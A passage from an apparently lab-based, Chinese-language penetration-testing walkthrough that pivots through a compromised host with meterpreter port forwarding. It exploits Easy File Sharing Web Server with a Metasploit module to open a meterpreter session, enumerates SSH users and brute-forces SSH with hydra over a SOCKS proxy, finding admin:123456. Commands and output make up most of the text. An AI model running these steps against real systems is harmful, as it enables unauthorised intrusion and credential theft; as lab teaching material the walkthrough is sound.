    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspxService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
    root@kali:~#
现在发现了7.7.7.20(JC)这台机器端口开放比较多,尝试找出JC的漏洞,操作如下:
首先看看JC的80端口运行了什么cms,但是Attacker的浏览器直接访问http://172.16.0.20会无法访问,因为Attacker的网段与JC
不在同一网段,此处有个要注意的内容:
Attention:可以选择使用proxychains设置Attacker的浏览器的代理为Attacker的1080端口的socks4代理入口,也可通过在RD的meterpreter会
话中运行portfwd模块命令,portfwd命令如下:
    meterpreter > portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20[*] Local TCP relay created: 172.16.0.20:2323  7.7.7.20:80meterpreter >
    meterpreter > portfwd listActive Port Forwards
    ====================
       Index  Local             Remote       Direction
       -----  -----             ------       ---------   1      172.16.0.20:2323  7.7.7.20:80  Forward1 total active port forwards.
    meterpreter >
通过访问Attacker的2323端口访问JC的80端口,结果如下:
这里的portfwd模块不只是名字上的端口转发的意思,目前笔者认为portfwd相当于半个ssh正向代理加一个ssh反向代理组成的综合命令,ssh正向反向代理可参考这里的理解
。ssh正向反向代理理解笔者认为portfwd命令之后Attacker可以通过访问Attacker本身ip的2323端口进而访问到JC的80端口期间发生了3件事。
1.RD访问JC的80端口,这里相当于半个ssh正向代理
2.RD绑定已经访问到的JC的80端口的数据到Attacker的2323端口,这里相当于一个ssh反向代理,相当于RD有Attacker的ssh权限
3.攻击者的浏览器访问攻击者自己的172.16.0.20:2323
portfwd的用法如下:
    meterpreter > portfwd -h
    Usage: portfwd [-h] [add | delete | list | flush] [args]
    OPTIONS:
         -L >opt>  The local host to listen on (optional).
         -h        Help banner.
         -l >opt>  The local port to listen on.
         -p >opt>  The remote port to connect on.
         -r >opt>  The remote host to connect on.
    meterpreter >
其中-L只能设置为攻击者的ip,不能设置为肉鸡的ip,-L设置的ip可以是攻击者的内网ip,-r也可以是目标的内网ip,两个内网之
间通过meterpreter会话的"隧道"来连通,如果-L后设置的ip是攻击者的内网ip,-r后设置的是目标机器的内网ip,portfwd通过
meterpreter会话连通两台,-l是指攻击者的监听端口,运行完上面的portfwd add -L 172.16.0.20 -l 2323 -p 80
-r 7.7.7.20 命令后,Attacker的2323端口将变成监听状态(也即Attacker会开启2323端口) 这里还要注意route
add命令只能是在meterpreter会话中有效,不能系统全局有效,笔者认为route add也是通过meterpreter会
话的"隧道"来实现攻击者能够访问目标机器其他网段机器的,也即在上面的Attacker通过portfwd来实现访问目标机器其他网段
机器而不能因为在portfwd模块运行前由于已经运行了route add模块而由Attacker的浏览器直接访问目标7.7.7.20:80,因为 route
add只会给msf的模块提供meterpreter会话通道作为代理服务,只有meterpreter会话下可用的模块可以直接访问7.7.7.x
网段,Attacker的浏览器想直接访问7.7.7.20需要使用proxychins和msf开启的sock4代理.
上面访问得到目标机器JC的80端口信息看出JC运行的是Eash File Sharing Web
Server,可用msf中的模块尝试getshell,操作如 下(如果没有在meterpreter中添加路由msf是访问不到7.7.7.20的):
    msf  > use exploit/windows/http/easyfilesharing_seh 
    msf exploit(easyfilesharing_seh) > show options 
    Module options (exploit/windows/http/easyfilesharing_seh):
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------       RHOST                   yes       The target address
       RPORT  80               yes       The target port
    Exploit target:
       Id  Name
       --  ----       0   Easy File Sharing 7.2 HTTP
    msf exploit(easyfilesharing_seh) > set rhost 7.7.7.20
    rhost => 7.7.7.20msf exploit(easyfilesharing_seh) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf exploit(easyfilesharing_seh) > run
    [*] Started bind handler
    [*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...
    [+] 7.7.7.20:80 - Exploit Sent
    [*] Sending stage (957999 bytes) to 7.7.7.20
    [*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -> 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300
或者从JC(7.7.7.20)22端口入手:
    msf > use auxiliary/scanner/ssh/ssh_enumusers 
    msf auxiliary(ssh_enumusers) > set rhosts 7.7.7.20rhosts => 7.7.7.20msf auxiliary(ssh_enumusers) > set rport 22rport => 22msf auxiliary(ssh_enumusers) > set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    user_file => /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    msf auxiliary(ssh_enumusers) > run
    [*] 7.7.7.20:22 - SSH - Checking for false positives
    [*] 7.7.7.20:22 - SSH - Starting scan
    [+] 7.7.7.20:22 - SSH - User 'admin' found
    [-] 7.7.7.20:22 - SSH - User 'root' not found
    [-] 7.7.7.20:22 - SSH - User 'Administrator' not found
    [+] 7.7.7.20:22 - SSH - User 'sysadm' found
    [-] 7.7.7.20:22 - SSH - User 'tech' not found
    [-] 7.7.7.20:22 - SSH - User 'operator' not found
    [+] 7.7.7.20:22 - SSH - User 'guest' found
    [-] 7.7.7.20:22 - SSH - User 'security' not found
    [-] 7.7.7.20:22 - SSH - User 'debug' not found
    [+] 7.7.7.20:22 - SSH - User 'manager' found
    [-] 7.7.7.20:22 - SSH - User 'service' not found
    [-] 7.7.7.20:22 - SSH - User '!root' not found
    [+] 7.7.7.20:22 - SSH - User 'user' found
    [-] 7.7.7.20:22 - SSH - User 'netman' not found
    [+] 7.7.7.20:22 - SSH - User 'super' found
    [-] 7.7.7.20:22 - SSH - User 'diag' not found
    [+] 7.7.7.20:22 - SSH - User 'Cisco' found
    [-] 7.7.7.20:22 - SSH - User 'Manager' not found
    [+] 7.7.7.20:22 - SSH - User 'DTA' found
    [-] 7.7.7.20:22 - SSH - User 'apc' not found
    [+] 7.7.7.20:22 - SSH - User 'User' found
    [-] 7.7.7.20:22 - SSH - User 'Admin' not found
    [+] 7.7.7.20:22 - SSH - User 'cablecom' found
    [-] 7.7.7.20:22 - SSH - User 'adm' not found
    [+] 7.7.7.20:22 - SSH - User 'wradmin' found
    [-] 7.7.7.20:22 - SSH - User 'netscreen' not found
    [+] 7.7.7.20:22 - SSH - User 'sa' found
    [-] 7.7.7.20:22 - SSH - User 'setup' not found
    [+] 7.7.7.20:22 - SSH - User 'cmaker' found
    [-] 7.7.7.20:22 - SSH - User 'enable' not found
    [+] 7.7.7.20:22 - SSH - User 'MICRO' found
    [-] 7.7.7.20:22 - SSH - User 'login' not found
    [*] Caught interrupt from the console...
    [*] Auxiliary module execution completed
    ^C
    msf auxiliary(ssh_enumusers) >
然后用hydra本地用msf模块开启的1080端口的sock4代理尝试爆破:
    root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
    ProxyChains-3.1 (http://proxychains.sf.net)
    Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    Hydra (http://www.thc.org/thc-hydra) starting 
    [WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
    [DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task
    [DATA] attacking service ssh on port 22
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-7.7.7.20:22-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK<><>-OK<><>-OK<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    [22][ssh] host: 7.7.7.20   login: admin   password: 123456
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished
    root@kali:~#
发现有可用帐户密码admin:123456,然后再用sock4代理ssh登录:
    root@kali:~# proxychains ssh PI:EMAIL